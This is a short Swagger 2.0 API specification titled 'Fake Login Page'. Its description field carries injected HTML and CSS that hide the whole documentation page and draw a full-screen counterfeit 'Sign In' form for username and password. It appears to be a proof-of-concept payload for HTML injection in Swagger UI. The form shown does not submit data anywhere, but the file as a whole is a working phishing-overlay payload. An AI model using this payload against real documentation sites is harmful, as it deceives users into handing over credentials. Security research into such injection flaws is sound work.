swagger: '2.0'
info:
  version: 1.0.0
  title: Fake Login Page
  description: '
  <style>
    body * {
      display: none !important;
    }
    #fake-login-wrapper, #fake-login-wrapper * {
      display: block !important;
    }
    #fake-login-wrapper {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: #f4f6f9;
      z-index: 999999;
      font-family: Arial, sans-serif;
      display: flex !important;
      align-items: center;
      justify-content: center;
    }
    .login-box {
      width: 350px;
      background: white;
      padding: 30px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.2);
      border-radius: 8px;
    }
    .login-box h1 {
      text-align: center;
      margin-bottom: 20px;
    }
    .login-box input {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    .login-box button {
      width: 100%;
      padding: 10px;
      background: #1976d2;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
  </style>

  <div id="fake-login-wrapper">
    <div class="login-box">
      <h1>Sign In</h1>
      <form>
        <input type="text" placeholder="Username">
        <input type="password" placeholder="Password">
        <button type="button">Login</button>
      </form>
    </div>
  </div>
  '
paths:
  /:
    post:
      responses:
        '200':
          description: Login successful
